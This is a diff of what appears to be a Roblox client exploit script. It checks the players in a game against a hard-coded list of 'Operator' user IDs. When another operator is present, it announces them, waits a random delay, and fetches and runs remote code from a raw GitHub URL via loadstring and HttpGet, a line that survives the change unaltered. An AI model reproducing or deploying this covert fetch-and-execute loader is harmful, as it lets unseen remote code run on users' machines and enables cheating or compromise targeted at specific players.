@@ -956,17 +956,18 @@ end)
 
 local Operator = {3957323123,3954711285,3954737528,3954747132,3954757934,3954785782,3956594839,3956699233,3956816184,3956898964,3956913967,3956993280}
 
-coroutine.wrap(function()
-    for i,v in pairs(game.Players:GetChildren()) do
-        if table.find(Operator,v.UserId) then
-            if v.Name == game.Players.LocalPlayer.Name then return end
+for i,v in pairs(game.Players:GetChildren()) do
+    if table.find(Operator,v.UserId) then
+        if v.Name == game.Players.LocalPlayer.Name then 
+            print("good")
+        else
             TITLE.Text = "    "..v.Name.."FOUND!!!"
             local ran = math.random(1, 15)
             wait(ran)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/shop/main/s"))()
         end
     end
-end)()
+end
 
 repeat task.wait() until aad
 
